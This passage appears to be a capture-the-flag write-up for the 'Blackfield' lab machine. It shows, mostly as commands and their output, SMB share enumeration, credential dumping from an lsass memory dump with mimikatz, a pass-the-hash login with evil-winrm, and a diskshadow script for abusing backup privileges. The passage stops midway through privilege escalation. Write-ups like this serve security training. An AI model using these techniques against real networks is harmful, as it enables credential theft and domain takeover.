<h3 id="from-the-smb-enumeration-in-the-starting-there-is-a-folder-called-forensic-with-the-help-of-user-audit2020-i-can-see-the-things-in-it">From the <code class="language-plaintext highlighter-rouge">smb</code> enumeration in the starting, there is a folder called <code class="language-plaintext highlighter-rouge">forensic</code>, with the help of user <code class="language-plaintext highlighter-rouge">audit2020</code> I can see the things in it.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020
</span><span class="n">Enter</span> <span class="n">WORKGROUP</span>\<span class="n">audit2020</span><span class="s">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: \&gt; 

</span></code></pre></div></div>
<h3 id="as-we-can-see-that-that-thing-works">As we can see that that thing <code class="language-plaintext highlighter-rouge">works</code>.</h3>

<h3 id="checking-juicy-info">Checking Juicy Info</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>commands_output
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">cd</span> ..
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>memory_analysis
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020                                                                                                                                                                 
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020                                                                                                                                                                 
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020                                                                                                                                                                 
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020                                                                                                                                                                 
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020                                                                                                                                                                 
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020                                                                                                                                                                 
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020                                                                                                                                                                 
                                                                                                                                                                                                                                           
                7846143 blocks of size 4096. 3821004 blocks available                                                                                                                                                                      
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span>  
</code></pre></div></div>
<h3 id="so-from-the-above-we-can-see-lsasszip-in-memory_analysis-folder-now-i-can-extract-the-lsasszip-and-use-mimikatz-to-get-the-ntlm-hash">So from the above we can see <code class="language-plaintext highlighter-rouge">lsass.zip</code> in <code class="language-plaintext highlighter-rouge">memory_analysis</code> folder, now I can extract the <code class="language-plaintext highlighter-rouge">lsass.zip</code> and use <code class="language-plaintext highlighter-rouge">mimikatz</code> to get the <code class="language-plaintext highlighter-rouge">NTLM</code> hash.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">oot</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020                                                                                                                                                                              </span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">audit2020</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 
</span><span class="no">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
<span class="nf">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">memory_analysis</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">parallel_read</span> <span class="n">returned</span> <span class="no">NT_STATUS_IO_TIMEOUT</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="p">(</span><span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h2 id="using-mimikatz">Using Mimikatz</h2>

<p>There are many blogs which are helpful how to use <code class="language-plaintext highlighter-rouge">mimikatz</code> for <code class="language-plaintext highlighter-rouge">hashdump</code> from <code class="language-plaintext highlighter-rouge">lsass </code></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz_trunk</span><span class="p">\</span><span class="n">x64</span><span class="o">&gt;</span><span class="n">mimikatz</span><span class="p">.</span><span class="nf">exe</span>

  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59</span>
 <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">'## v ##'</span>       <span class="no">Vincent</span> <span class="no">LE</span> <span class="no">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="p">.</span><span class="nf">letoux</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span> <span class="p">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">pingcastle</span><span class="p">.</span><span class="nf">com</span> <span class="o">/</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="nf">com</span>   <span class="o">***</span><span class="sr">/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">153705</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">00025</span><span class="mi">869</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">Administrator</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mo">04</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">500</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">7</span><span class="n">f1e4ff8c6a8e6b6fcae2d9c0572cd62</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="n">db5c89a961644f0978b4b69a4d2a2239d7886368</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="mi">240339</span><span class="n">f898b6ac4ce3f34702e4a89550</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">40310</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">0000</span><span class="mi">9</span><span class="n">d76</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">DWM</span><span class="o">-</span><span class="mi">1</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">Window</span> <span class="no">Manager</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">90</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="n">b624dc83a27cc29da11d9bf25efea796</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">4</span><span class="n">f2a203784d655bb3eda54ebe0cfdabe93d4a37d</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="o">&amp;</span><span class="no">SYVE</span><span class="o">+&lt;</span><span class="n">ynu</span><span class="sb">`Ql;gvEE!f$DoO0F+,gP@P`</span><span class="n">fra</span><span class="sb">`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`</span><span class="n">b</span><span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span><span class="o">&lt;</span><span class="no">Vb0I6</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>



<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">406499</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">000633</span><span class="n">e3</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">2</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="n">svc_backup</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>


</code></pre></div></div>

<h3 id="at-this-point-i-was-a-little-exited-as-i-got-the-admin--hash-but-yeah-dont-expect-anything-to-be-simple">At this point I was a little exited as I got the <code class="language-plaintext highlighter-rouge">Admin </code> hash, But yeah <code class="language-plaintext highlighter-rouge">Don't expect anything to be simple</code>.</h3>
<h3 id="so-i-tried-to-crack-the-hash-of-svc-backup-but-no-luck-so-i-tried-to-pass-the-hash-using-evil-winrm">So I tried to crack the hash of <code class="language-plaintext highlighter-rouge">SVC-Backup</code> but no luck, So I tried to pass the hash using <code class="language-plaintext highlighter-rouge">Evil-winrm</code>.</h3>

<p>` evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb`</p>

<h3 id="it-was-a-success">It was a Success!</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfiled.htb

 Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;
</code></pre></div></div>
<h2 id="getting-usertxt">Getting User.txt</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="mf">3e666</span><span class="o">----------------------------</span><span class="mi">30</span><span class="n">a</span>             
</code></pre></div></div>
<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="seeing-the-privileges-of-svc-backup">Seeing the privileges of <code class="language-plaintext highlighter-rouge">svc-backup</code></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION                                                                                                                                                                            
<span class="nt">----------------</span>
User Name             SID                                                                                                                                                                                                                  
<span class="o">=====================</span> <span class="o">==============================================</span>
blackfield<span class="se">\s</span>vc_backup S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                                                     
GROUP INFORMATION                                                                                                                                                                                                                          
<span class="nt">-----------------</span>

Group Name                                 Type             SID          Attributes                                                                                                                                                        
<span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\B</span>ackup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled


USER CLAIMS INFORMATION
<span class="nt">-----------------------</span>

User claims unknown.

Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<h3 id="enumerating-you-will-find-notestxt-and-since-svc_backup-has-backup-ability-robocopy-can-be-exploited-in-a-way">Enumerating you will find notes.txt and since svc_backup has backup ability robocopy can be exploited in a way.</h3>

<p><a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># cat jeevan.txt </span>
<span class="no">SET</span> <span class="no">CONTEXT</span> <span class="no">PERSISTENT</span> <span class="no">NOWRITERS</span><span class="c1">#</span>
<span class="n">add</span> <span class="n">volume</span> <span class="ss">c: </span><span class="k">alias</span> <span class="n">jeevan</span><span class="c1">#</span>
<span class="n">createp</span><span class="c1">#</span>
<span class="n">expose</span> <span class="o">%</span><span class="n">jeevan</span><span class="o">%</span> <span class="n">z</span><span class="p">:</span><span class="c1">#</span>
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; diskshadow /s jeevan.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  7/11/2020 2:44:35 PM

-&gt; SET CONTEXT PERSISTENT NOWRITERS
-&gt; add volume c: <span class="nb">alias </span>jeevan
-&gt; create
Alias jeevan <span class="k">for </span>shadow ID <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>

        <span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>               %jeevan%
                - Shadow copy <span class="nb">set</span>: <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>       %VSS_SHADOW_SET%
                - Original count of shadow copies <span class="o">=</span> 1
                - Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
                - Creation <span class="nb">time</span>: 7/11/2020 2:44:35 PM
                - Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %jeevan% z:
-&gt; %jeevan% <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\W</span>indows<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
<span class="nt">-a----</span>        7/11/2020   2:44 PM             90 jeevan.txt
<span class="nt">-a----</span>        7/11/2020   1:13 PM         135470 MpCmdRun.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM            102 silconfig.log
<span class="nt">------</span>        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
<span class="nt">------</span>        7/11/2020  12:43 PM          15832 vmware-vmusr.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM           1728 vmware-vmvss.log


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<p>At this point I realised the privs of <code class="language-plaintext highlighter-rouge">svc-backup</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
